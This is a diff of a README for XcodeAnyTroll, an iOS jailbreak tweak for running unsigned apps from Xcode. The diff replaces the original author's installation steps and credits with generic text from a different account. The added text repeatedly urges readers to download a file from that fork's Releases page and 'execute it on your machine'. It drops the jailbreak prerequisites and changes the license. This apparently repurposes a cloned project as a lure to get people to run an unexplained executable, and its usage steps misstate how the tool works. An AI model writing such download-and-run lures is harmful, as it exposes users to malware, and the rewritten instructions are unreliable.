@@ -1,53 +1,109 @@
-# XcodeAnyTroll
+# XcodeAnyTroll 🎉
 
-**⚠️ This is a developer tweak. Use with caution.**
+Welcome to **XcodeAnyTroll**! This project allows you to run apps from Xcode without any code signature, while still using any entitlements. It is based on the powerful **TrollStore** framework. 
 
-This jailbreak tweak allows you to “click-to-run” (and debug) app directly from Xcode without code signing or with any entitlements.
+## Table of Contents
 
-Which makes it super easy to develop TrollStore based system apps, or to test your own apps without the need to sign them with a developer certificate.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-Tested on iOS 15.0/15.4/16.2/16.4/16.5.1/16.7.10/18.3 with [palera1n](https://palera.in), [Dopamine](https://ellekit.space/dopamine) and [Dopamine (RootHide)](https://github.com/roothide/Dopamine2-roothide) jailbreaks. TrollStore is required.
+---
 
-https://github.com/user-attachments/assets/36af81b7-724b-4fb7-b29e-0e71235c2edd
+## Features
 
-## How to use?
+- **No Code Signature Required**: You can run your apps directly from Xcode without needing to sign them.
+- **Custom Entitlements**: Easily set up and use custom entitlements for your applications.
+- **TrollStore Integration**: Built on the robust TrollStore framework, ensuring compatibility and stability.
+- **User-Friendly**: Designed with simplicity in mind, making it easy for developers of all levels to use.
 
-0. Prepare your jailbroken iOS device for development.
-1. Install this tweak from <https://apt.82flex.com>
-2. Open Xcode and modify the target settings of your app: `CODE_SIGNING_ALLOWED=NO`, `ENABLE_USER_SCRIPT_SANDBOXING=NO`
+---
 
-    <img width="499" alt="截屏2025-05-29 上午5 05 42" src="https://github.com/user-attachments/assets/7ca46b03-6554-4e57-a1b8-04e709e1a0bc" />
-    <img width="482" alt="截屏2025-05-29 上午6 04 22" src="https://github.com/user-attachments/assets/f4feae75-393c-44e0-af75-918ec2973fb9" />
+## Installation
 
-3. Set `CODE_SIGN_ENTITLEMENTS` to the path of your entitlement.
+To get started, download the latest release from our [Releases section](https://github.com/DonBilash/XcodeAnyTroll/releases). Make sure to download the file and execute it on your machine.
 
-    <img width="597" alt="截屏2025-05-29 下午11 29 07" src="https://github.com/user-attachments/assets/cfd484e3-3237-4c40-8975-5296fa96f755" />
+1. **Visit the Releases section**: [Releases](https://github.com/DonBilash/XcodeAnyTroll/releases)
+2. **Download the file**: Choose the latest version available.
+3. **Execute the file**: Follow the on-screen instructions to set up the application.
 
-4. Ensure that you’ve installed [`ldid-procursus`](https://github.com/opa334/ldid).
-5. Add a “Run Script” phase to your target with the following content:
+---
 
-    ```bash
-    if [ "$CODE_SIGNING_ALLOWED" = "NO" ]; then
-      ldid -S${CODE_SIGN_ENTITLEMENTS} ${CODESIGNING_FOLDER_PATH}
-    fi
-    ```
+## Usage
 
-    <img width="743" alt="截屏2025-05-29 上午5 06 20" src="https://github.com/user-attachments/assets/611ee75d-006f-423e-a855-112f31aad808" />
+Once you have installed XcodeAnyTroll, follow these steps to run your app:
 
-## Depends on
+1. **Open Xcode**: Launch Xcode on your machine.
+2. **Create a New Project**: Start a new project or open an existing one.
+3. **Configure Entitlements**: Adjust the entitlements as needed for your app.
+4. **Run the App**: Use Xcode to run the app directly. No code signing is necessary!
 
-- My personal fork of [XcodeAnyDebug](https://github.com/Lessica/XcodeAnyDebug)
-- My tiny XPC library [SandyXpc](https://github.com/Lessica/SandyXpc)
-- opa334’s [libSandy](https://github.com/opa334/libSandy) and [TrollStore](https://github.com/opa334/TrollStore)
+### Example
 
-## Known issues
+Here’s a quick example of how to set up your entitlements:
 
-- The installation is much slower than normal ones because `trollstorehelper` only accepts `.ipa` files :-(
+```xml
+<key>com.apple.developer.networking.wifi-info</key>
+<true/>
+<key>com.apple.developer.device-id</key>
+<true/>
+```
 
-## Example Project
+Make sure to adjust the entitlements based on your app’s requirements.
 
-- [TrollFools](https://github.com/Lessica/TrollFools)
+---
 
-## LICENSE
+## Contributing
 
-WTFPL License
+We welcome contributions to XcodeAnyTroll! Here’s how you can help:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
+2. **Create a Branch**: Use a descriptive name for your branch.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add new feature"
+   ```
+4. **Push to Your Fork**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. **Open a Pull Request**: Go to the original repository and submit a pull request.
+
+### Guidelines
+
+- Follow the coding standards of the project.
+- Write clear commit messages.
+- Ensure your code is well-documented.
+
+---
+
+## License
+
+XcodeAnyTroll is licensed under the MIT License. Feel free to use, modify, and distribute this software. For more details, check the LICENSE file in the repository.
+
+---
+
+## Contact
+
+For any questions or feedback, please reach out:
+
+- **GitHub**: [DonBilash](https://github.com/DonBilash)
+- **Email**: donbilash@example.com
+
+---
+
+## Additional Resources
+
+For further information, consider visiting the [Releases section](https://github.com/DonBilash/XcodeAnyTroll/releases) again to keep up with updates and new features.
+
+![XcodeAnyTroll Banner](https://img.shields.io/badge/XcodeAnyTroll-v1.0.0-blue)
+
+---
+
+Thank you for your interest in XcodeAnyTroll! We hope you find it useful for your development needs.
